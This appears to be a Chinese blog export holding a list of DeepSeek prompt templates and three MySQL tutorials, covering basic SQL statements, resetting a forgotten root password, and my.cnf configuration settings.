<h2 id="外出旅行类-5个"><a href="#外出旅行类-5个" class="headerlink" title="外出旅行类 (5个)"></a>外出旅行类 (5个)</h2><p><strong>地道风味探索：</strong>我计划去[城市名]旅行，请推荐当地人才会去的、最具代表性的地道美食、小吃和特色餐馆。<br><strong>专属行程定制：</strong>请为我规划一条为期[天数]的[目的地]深度游路线，要求包含小众景点、特色体验和每日时间规划。<br><strong>旅拍大师课：</strong>请传授一些旅行中用手机就能拍出大片的实用摄影技巧，重点讲解构图、光影运用和人景合一的窍门。<br><strong>博物馆奇妙游：</strong>我准备参观[某个博物馆或景点]，请提供一份高效的游览路线，并讲解其中不容错过的镇馆之宝或必看展品背后的故事。<br><strong>金牌导游解说：</strong>请你化身资深导游，用生动有趣的语言向我介绍[目的地]，突出其独特的历史文化和必须体验的特色活动。</p>
<h2 id="文本润色类-5个"><a href="#文本润色类-5个" class="headerlink" title="文本润色类 (5个)"></a>文本润色类 (5个)</h2><p><strong>文字变声器：</strong>请将下面这段文字，用[更专业&#x2F;更亲切&#x2F;更幽默]的语气重新表述一遍。<br><strong>显微镜描写：</strong>请将“他很惊讶”这个简单的描述，扩写成一段包含微表情、肢体语言和心理活动的特写镜头式文本。<br><strong>读者画像定制：</strong>请将以下内容改写，使其风格和措辞更符合[目标读者群体，如小学生、行业专家]的阅读习惯和知识背景。<br><strong>语言魔术师：</strong>请用比喻、拟人、排比、夸张、对偶这五种修辞手法，分别重写这个句子：“夕阳下的湖面很美。”<br><strong>五感沉浸体验：</strong>请为下面这段文字注入丰富的感官细节，包括视觉、听觉、嗅觉、触觉和味觉的描写，让读者身临其境。</p>
<h2 id="学习备考类-5个"><a href="#学习备考类-5个" class="headerlink" title="学习备考类 (5个)"></a>学习备考类 (5个)</h2><p><strong>知识框架构建：</strong>请帮我梳理[某门学科]的核心知识体系，以思维导图的Markdown格式列出关键概念和它们之间的逻辑联系。<br><strong>高分应试蓝图：</strong>请深入分析[某项考试]的题型分布、难度梯度和评分标准，并据此制定一套科学的备考冲刺计划。<br><strong>高效记忆法：</strong>针对[某个复杂的知识点或一长串单词]，请设计一个巧妙的、结合联想或故事的记忆方法。<br><strong>避错指南：</strong>请总结[某学科]选择题中常见的“陷阱”选项类型，并教授我快速识别并排除这些干扰项的技巧。<br><strong>苏格拉底式提问：</strong>这里有一道[题目]，请不要直接给我答案，而是通过一系列引导性问题，启发我独立思考并找到解题路径。</p>
<h2 id="求职面试类-5个"><a href="#求职面试类-5个" class="headerlink" title="求职面试类 (5个)"></a>求职面试类 (5个)</h2><p><strong>薪酬博弈顾问：</strong>我收到了[岗位]的offer，请根据我的[个人情况和市场行情]，提供一些有效的薪资谈判策略和话术。<br><strong>简历点金手：</strong>这是我的简历和目标岗位的JD（职位描述），请指出简历中的不足之处，并提供具体的、可直接复制修改的优化建议。<br><strong>全真面试官：</strong>请你扮演[目标岗位]的资深面试官，对我进行一场高压模拟面试，并在我回答后，针对我的表现给出细致的反馈和改进建议。<br><strong>云面试宝典：</strong>我即将参加一个线上面试，请提醒我所有需要提前准备的技术设备、环境布置、着装以及流程中的礼仪细节。<br><strong>面试通关秘籍：</strong>请列出[目标岗位]最常见的5个面试问题，并为每个问题提供基于STAR原则的回答框架和优秀范例。</p>
<h2 id="创业常用类-5个"><a href="#创业常用类-5个" class="headerlink" title="创业常用类 (5个)"></a>创业常用类 (5个)</h2><p><strong>市场机会雷达：</strong>请基于[某个现有产品、服务或社会现象]，分析其中尚未被满足的用户需求，并挖掘出三个具体的、可行的潜在商业机会。<br><strong>品牌创意工坊：</strong>我正在为[我的产品&#x2F;公司]构思名字，它属于[行业]领域，请提供20个有创意、易于传播且尚未被注册的品牌备选名。<br><strong>战略分析师：</strong>请运用波特五力模型或SWOT分析法，对[某个行业]的竞争格局进行深度剖析，并提出初步的差异化竞争策略建议。<br><strong>可行性分析报告：</strong>我有一个[描述创业想法]的idea，请从市场规模、盈利模式、竞争壁垒、目标用户和启动成本等维度，客观评估其商业潜力和成功的关键要素。<br><strong>融资导航员：</strong>我的创业项目目前处于[发展阶段，如种子轮]，核心数据是[列举数据]，请推荐几个最匹配的潜在融资渠道或投资机构，并说明理由。</p>
<h2 id="回答优化类-5个"><a href="#回答优化类-5个" class="headerlink" title="回答优化类 (5个)"></a>回答优化类 (5个)</h2><p><strong>答案化繁为简：</strong>你能用一个10岁孩子都能听懂的比喻，重新解释一下刚才那个复杂的概念吗？<br><strong>激发深度思考：</strong>在你的回答之后，能否提出三个相关且能引发我进一步思考的问题？<br><strong>智能预判：</strong>根据我刚才的提问，你能不能预测一下我接下来可能还想了解哪三个相关问题？<br><strong>寓教于乐：</strong>能用一个有趣的历史故事或生动的比喻，来让你的解释更容易被理解和记住吗？<br><strong>优化排版：</strong>请重新组织一下上面的长篇回答，使用标题、列表和粗体等方式，让它的结构更清晰，关键信息一目了然。</p>
<h2 id="问题分析类-5个"><a href="#问题分析类-5个" class="headerlink" title="问题分析类 (5个)"></a>问题分析类 (5个)</h2><p><strong>第一性原理思维：</strong>请运用第一性原理，层层剥开表象，分析[某个复杂问题]最本质的构成要素和根源。<br><strong>未来沙盘推演：</strong>请分析[某个事件或决策]可能在短期、中期和长期分别带来哪些正面和负面的连锁影响。<br><strong>思想碰撞实验：</strong>请分别扮演正反双方，就“[某个争议性话题]”进行一场多回合的、有理有据的深度辩论。<br><strong>成功案例复盘：</strong>请深入剖析[某个成功项目或公司，如SpaceX]的崛起过程，总结出其成功的关键驱动因素和可供借鉴的核心经验。<br><strong>问题根源透视：</strong>请构建一个鱼骨图（因果分析图），系统地分析导致[某个问题，如“团队效率低下”]发生的各种潜在原因，并提出针对性的解决方案。</p>
<h2 id="输出形式类-5个"><a href="#输出形式类-5个" class="headerlink" title="输出形式类 (5个)"></a>输出形式类 (5个)</h2><p><strong>前端代码生成器：</strong>请将以上[内容]转换成一个结构良好、带有基础响应式CSS样式的HTML网页代码。<br><strong>模板百宝箱：</strong>我需要写一份[模板名称，如项目计划书]，请提供一个专业的、内容详尽的参考模板，并附上一个填写完整的范例。<br><strong>多维度比较器：</strong>请创建一个表格，从[角度一、角度二、角度三]等多个维度，详细对比[A事物]和[B事物]的异同与优劣。<br><strong>流程可视化：</strong>请使用Mermaid代码，生成一个描述“[某个流程，如用户注册与登录]”的清晰流程图。<br><strong>结构化思考：</strong>请使用Markdown格式，为“[某个复杂主题，如“人工智能的历史”]”生成一个层级清晰、逻辑严谨的思维导图大纲。</p>
<h2 id="信息处理类-5个"><a href="#信息处理类-5个" class="headerlink" title="信息处理类 (5个)"></a>信息处理类 (5个)</h2><p><strong>核心思想提炼：</strong>请阅读以下长文，并为我生成一段不超过100字的、精准概括其核心论点与论据的摘要。<br><strong>智能信息管家：</strong>请根据[自定义的分类标准，如“紧急重要”、“工作相关”、“个人兴趣”]，对以下混杂的文本信息进行自动归类整理。<br><strong>智能纠错大师：</strong>请仔细检查并修正下面这段文字中的所有语法错误、拼写、标点误用和事实性错误。<br><strong>双语精确翻译：</strong>请将以下段落翻译成[目标语言]，并以原文和译文逐句对照的形式呈现，以便于学习和校对。<br><strong>关键信息捕手：</strong>请从[我上传的文件或提供的文本]中，精准提取出所有与[关键词或主题]相关的数据、人名、地点和关键结论。</p>
<h2 id="阅读常用类-5个"><a href="#阅读常用类-5个" class="headerlink" title="阅读常用类 (5个)"></a>阅读常用类 (5个)</h2><p><strong>文本深度剖析：</strong>请对[某本书]中的这一段话进行深度解读，分析其字面意思、深层含义、修辞手法和在全书中的作用。<br><strong>主题书单策展人：</strong>我想深入了解[某个领域]，请为我推荐一份该领域的“从入门到精通”阶梯式必读书单，每本书需附上核心内容简介及推荐理由。<br><strong>高效阅读框架：</strong>请为阅读[虚构类&#x2F;非虚构类]书籍，设计一个结构化的读书笔记模板，帮助我更好地吸收和记录书本内容，并提供一个使用范例。<br><strong>阅读方法论大全：</strong>请总结并介绍几种主流的高效阅读方法（如SQ3R法、费曼学习法等），并说明它们各自适用的书籍或文章类型。<br><strong>知识体系构建：</strong>我每天通过手机阅读大量碎片化信息，请教我一套有效的方法，将这些零散的知识点进行整合、归纳，最终内化为自己的、结构化的知识体系。</p>
]]></content>
      <categories>
        <category>DeepSeek</category>
      </categories>
      <tags>
        <tag>DeepSeek</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据库一【基础语句】</title>
    <url>/cnblogs.github.io/p/37224.html</url>
    <content><![CDATA[<h4 id="MySQL数据库语句"><a href="#MySQL数据库语句" class="headerlink" title="MySQL数据库语句"></a>MySQL数据库语句</h4><h5 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database name; 创建数据库</span><br></pre></td></tr></table></figure>
<h5 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use databasename; 选择数据库</span><br></pre></td></tr></table></figure>
<h5 id="选择数据库-1"><a href="#选择数据库-1" class="headerlink" title="选择数据库"></a>选择数据库</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> database name; 删除数据库</span><br></pre></td></tr></table></figure>
<h4 id="MySQL表语句"><a href="#MySQL表语句" class="headerlink" title="MySQL表语句"></a>MySQL表语句</h4><h5 id="新建表"><a href="#新建表" class="headerlink" title="新建表"></a>新建表</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 新增一个User表</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> <span class="keyword">user</span>(</span><br><span class="line">id <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">create_by <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建人&#x27;</span>,</span><br><span class="line">create_date datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_by <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;更新人&#x27;</span>,</span><br><span class="line">update_date datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;更新时间&#x27;</span>,</span><br><span class="line">status <span class="type">varchar</span>(<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;数据状态&#x27;</span>,</span><br><span class="line"><span class="keyword">PRIMARY KEY</span> (id)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;user表&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="新增表字段"><a href="#新增表字段" class="headerlink" title="新增表字段"></a>新增表字段</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="keyword">user</span> <span class="keyword">add</span> <span class="keyword">COLUMN</span> age <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;年龄&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="修改表字段"><a href="#修改表字段" class="headerlink" title="修改表字段"></a>修改表字段</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="keyword">user</span> MODIFY <span class="keyword">COLUMN</span> age <span class="type">varchar</span>(<span class="number">64</span>) COMMENT <span class="string">&#x27;年龄&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="删除表字段"><a href="#删除表字段" class="headerlink" title="删除表字段"></a>删除表字段</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="keyword">user</span> <span class="keyword">DROP</span> age;</span><br></pre></td></tr></table></figure>
<h4 id="MySQL管理语句"><a href="#MySQL管理语句" class="headerlink" title="MySQL管理语句"></a>MySQL管理语句</h4><h5 id="连接本机数据库"><a href="#连接本机数据库" class="headerlink" title="连接本机数据库"></a>连接本机数据库</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>uroot <span class="operator">-</span>p密码</span><br></pre></td></tr></table></figure>
<h5 id="连接到远程主机上的MYSQL"><a href="#连接到远程主机上的MYSQL" class="headerlink" title="连接到远程主机上的MYSQL"></a>连接到远程主机上的MYSQL</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>uroot <span class="operator">-</span>p <span class="number">123456</span></span><br></pre></td></tr></table></figure>
<h5 id="修改mysql中root的密码"><a href="#修改mysql中root的密码" class="headerlink" title="修改mysql中root的密码"></a>修改mysql中root的密码</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqladmin <span class="operator">-</span>u root password &quot;newpwd&quot;;</span><br></pre></td></tr></table></figure>
<h5 id="添加创建用户"><a href="#添加创建用户" class="headerlink" title="添加创建用户"></a>添加创建用户</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> mikechen;   添加用户</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;mikechen&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;password&#x27;</span> ;  给用户权限这里是把操作数据库的所有权限给了mikechen，并且设置密码是password。</span><br></pre></td></tr></table></figure>
<h4 id="MySQL增删改查语句"><a href="#MySQL增删改查语句" class="headerlink" title="MySQL增删改查语句"></a>MySQL增删改查语句</h4><h5 id="MySQL插入数据"><a href="#MySQL插入数据" class="headerlink" title="MySQL插入数据"></a>MySQL插入数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert into</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> ( <span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span>, ...) <span class="keyword">values</span> ( 值<span class="number">1</span>, ...)</span><br></pre></td></tr></table></figure>
<h5 id="MySQL删除数据"><a href="#MySQL删除数据" class="headerlink" title="MySQL删除数据"></a>MySQL删除数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 [<span class="keyword">where</span>  条件]</span><br></pre></td></tr></table></figure>
<h5 id="MySQL修改数据"><a href="#MySQL修改数据" class="headerlink" title="MySQL修改数据"></a>MySQL修改数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 字段名<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>，字段名<span class="number">2</span><span class="operator">=</span>值<span class="number">2</span>，....[<span class="keyword">where</span>条件]</span><br></pre></td></tr></table></figure>
<h5 id="MySQL查询数据"><a href="#MySQL查询数据" class="headerlink" title="MySQL查询数据"></a>MySQL查询数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">&lt;</span>字段<span class="number">1</span>，字段<span class="number">2</span>，...<span class="operator">&gt;</span> <span class="keyword">from</span> <span class="operator">&lt;</span> 表名 <span class="operator">&gt;</span> <span class="keyword">where</span> <span class="operator">&lt;</span> 表达式 <span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="MySQL索引语句"><a href="#MySQL索引语句" class="headerlink" title="MySQL索引语句"></a>MySQL索引语句</h4><h5 id="使用CREATE-INDEX"><a href="#使用CREATE-INDEX" class="headerlink" title="使用CREATE INDEX"></a>使用CREATE INDEX</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">能够增加普通索引和<span class="keyword">UNIQUE</span>索引两种，其格式如下：</span><br><span class="line"><span class="keyword">create</span> index index_name <span class="keyword">on</span> table_name (column_list) ;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> index index_name <span class="keyword">on</span> table_name (column_list) ;</span><br></pre></td></tr></table></figure>
<h5 id="使用ALTER-TABLE"><a href="#使用ALTER-TABLE" class="headerlink" title="使用ALTER TABLE"></a>使用ALTER TABLE</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="keyword">PRIMARY KEY</span>（主键索引）</span><br><span class="line">        mysql<span class="operator">&gt;</span> <span class="keyword">ALTER TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">PRIMARY KEY</span> index_name(`column1`, `column2`) </span><br><span class="line"><span class="number">2.</span><span class="keyword">UNIQUE</span>(唯一索引)</span><br><span class="line">        mysql<span class="operator">&gt;</span> <span class="keyword">ALTER TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> index_name(`column1`, `column2`) </span><br><span class="line"><span class="number">3.</span>INDEX(普通索引)</span><br><span class="line">        mysql<span class="operator">&gt;</span> <span class="keyword">ALTER TABLE</span> `table_name` <span class="keyword">ADD</span> INDEX index_name (`column1`, `column2`)</span><br><span class="line"><span class="number">4.</span>FULLTEXT(全文索引)</span><br><span class="line">        mysql<span class="operator">&gt;</span> <span class="keyword">ALTER TABLE</span> `table_name` <span class="keyword">ADD</span> FULLTEXT (`column1`, `column2`)</span><br></pre></td></tr></table></figure>
<h5 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span>如果查看索引前，没有使用<span class="keyword">user</span> db_name等命令指定具体的数据库，则必须加上<span class="keyword">FROM</span> db_name</span><br><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> table_name [<span class="keyword">FROM</span> db_name]</span><br><span class="line"><span class="comment">--如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上db_name.前缀</span></span><br><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> [db_name.]table_name</span><br></pre></td></tr></table></figure>
<h5 id="修改索引"><a href="#修改索引" class="headerlink" title="修改索引"></a>修改索引</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span>先删除</span><br><span class="line"><span class="keyword">ALTER TABLE</span> <span class="keyword">user</span></span><br><span class="line"><span class="keyword">DROP</span> INDEX idx_user_username;</span><br><span class="line"><span class="comment">--再以修改后的内容创建同名索引</span></span><br><span class="line"><span class="keyword">CREATE</span> INDEX idx_cust_name <span class="keyword">ON</span> customers (cust_name(<span class="number">8</span>));</span><br></pre></td></tr></table></figure>
<h5 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> customers</span><br><span class="line"><span class="keyword">DROP</span> INDEX idx_cust_name;</span><br></pre></td></tr></table></figure>
<h4 id="MySQL查询语句"><a href="#MySQL查询语句" class="headerlink" title="MySQL查询语句"></a>MySQL查询语句</h4><h5 id="直接查询"><a href="#直接查询" class="headerlink" title="直接查询"></a>直接查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure>
<h5 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件</span><br></pre></td></tr></table></figure>
<h5 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 字段 排序方式(<span class="keyword">desc</span>:<span class="keyword">asc</span>)</span><br></pre></td></tr></table></figure>
<h5 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> userwhere age <span class="operator">&gt;=</span><span class="number">21</span> <span class="keyword">and</span> age<span class="operator">&lt;=</span><span class="number">23</span>;</span><br></pre></td></tr></table></figure>
<h5 id="SQL查询五子句"><a href="#SQL查询五子句" class="headerlink" title="SQL查询五子句"></a>SQL查询五子句</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span><span class="operator">/</span>字段列表 <span class="keyword">from</span> 数据表名称 <span class="keyword">where</span> 子句 <span class="keyword">group</span> <span class="keyword">by</span> 子句 <span class="keyword">having</span> 子句 <span class="keyword">order</span> <span class="keyword">by</span> 子句 limit 子句;</span><br><span class="line"></span><br><span class="line">①.<span class="keyword">where</span> 子句</span><br><span class="line">②.<span class="keyword">group</span> <span class="keyword">by</span> 子句</span><br><span class="line">③.<span class="keyword">having</span> 子句</span><br><span class="line">④.<span class="keyword">order</span> <span class="keyword">by</span> 子句</span><br><span class="line">⑤.limit子句</span><br></pre></td></tr></table></figure>
<h5 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> uid, name <span class="keyword">FROM</span> staffs <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;a%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="集合查询"><a href="#集合查询" class="headerlink" title="集合查询"></a>集合查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> uid, name <span class="keyword">FROM</span> staffs <span class="keyword">WHERE</span> uid <span class="keyword">IN</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
<h5 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> staffs LIMIT <span class="number">5</span>, <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
<h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h5><p><img src="https://s2.loli.net/2025/01/18/Gm3nWlJZ7H5RNt6.gif"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_list</span><br><span class="line"><span class="keyword">FROM</span> t1</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> t2 <span class="keyword">ON</span> join_condition;</span><br></pre></td></tr></table></figure>
<p>也叫内连接或等值连接，用于获取两个表中字段匹配关系的记录。</p>
<p><img src="https://s2.loli.net/2025/01/18/9sA2NhSRmMzJiwU.gif"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    t1.c1, t1.c2, t2.c1, t2.c2</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    t1</span><br><span class="line">        <span class="keyword">LEFT</span> <span class="keyword">JOIN</span></span><br><span class="line">    t2 <span class="keyword">ON</span> t1.c1 <span class="operator">=</span> t2.c1;</span><br></pre></td></tr></table></figure>
<p>左连接：获取左表所有记录，即使右表没有对应匹配的记录。</p>
<p><img src="https://s2.loli.net/2025/01/18/MtLPk146X3l5CHq.gif"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> students <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">right</span> <span class="keyword">join</span> teacher <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">on</span> s.class_id <span class="operator">=</span> t.class_id</span><br></pre></td></tr></table></figure>
<p>与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据库三【重置root密码-忘记原密码】</title>
    <url>/cnblogs.github.io/p/22924.html</url>
    <content><![CDATA[<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>重置MySQL root密码的通用步骤（适用于MySQL 5.7及8.0版本）：<br><strong>方法一：通过跳过权限验证重置密码36</strong><br>停止MySQL服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows</span></span><br><span class="line">net stop MySQL80</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux（systemd系统）</span></span><br><span class="line">sudo systemctl stop mysqld</span><br></pre></td></tr></table></figure>
<p>以无权限模式启动MySQL,保持当前终端窗口运行（不要关闭）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需指定my.ini/my.cnf路径（Windows参考路径示例）</span></span><br><span class="line">mysqld --defaults-file=&quot;C:\ProgramData\MySQL\MySQL Server 8.0\my.ini&quot; --skip-grant-tables --shared-memory</span><br></pre></td></tr></table></figure>
<p>重置密码,新开一个终端窗口执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u root</span><br></pre></td></tr></table></figure>
<p>在MySQL交互界面输入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">FLUSH PRIVILEGES;  <span class="comment">-- 刷新权限（必须执行）</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;YourNewPass&#x27;</span>;  <span class="comment">-- MySQL 5.7+</span></span><br><span class="line"><span class="comment">-- 或（MySQL 8.0可能需要指定插件）</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;YourNewPass&#x27;</span>;</span><br><span class="line">FLUSH PRIVILEGES;  <span class="comment">-- 再次刷新</span></span><br><span class="line">EXIT;</span><br></pre></td></tr></table></figure>
<p>重启MySQL服务,回到第2步的窗口按Ctrl+C终止无权限模式，然后重启服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows</span></span><br><span class="line">net start MySQL80</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux</span></span><br><span class="line">sudo systemctl start mysqld</span><br></pre></td></tr></table></figure>
<p><strong>方法二：通过初始化文件重置密码4</strong><br>创建初始化文件,新建文本文件mysql-init.txt，写入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;NewPassword&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>启动MySQL时加载文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqld --init-file=/path/to/mysql-init.txt --console</span><br></pre></td></tr></table></figure>
<p>启动后密码即被修改，完成后删除初始化文件。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据库二【配置与命令详解】</title>
    <url>/cnblogs.github.io/p/40284.html</url>
    <content><![CDATA[<h4 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"># 基础设置</span><br><span class="line">datadir=/var/lib/mysql           # 数据文件存储路径</span><br><span class="line">socket=/var/lib/mysql/mysql.sock  # Unix套接字路径</span><br><span class="line">pid-file=/var/run/mysqld/mysqld.pid  # 进程ID文件</span><br><span class="line">port=3306                        # 服务端口</span><br><span class="line">user=mysql                       # 运行用户</span><br><span class="line"></span><br><span class="line"># 字符集设置（重要！避免乱码）</span><br><span class="line">character-set-server=utf8mb4     # 服务器默认字符集</span><br><span class="line">collation-server=utf8mb4_unicode_ci  # 默认排序规则</span><br><span class="line">init_connect=&#x27;SET NAMES utf8mb4&#x27;  # 客户端连接时自动设置</span><br><span class="line"></span><br><span class="line"># 网络与安全</span><br><span class="line">bind-address=0.0.0.0             # 监听所有IP（生产环境建议指定具体IP）</span><br><span class="line">skip-name-resolve                # 禁用DNS解析，提高性能</span><br></pre></td></tr></table></figure>
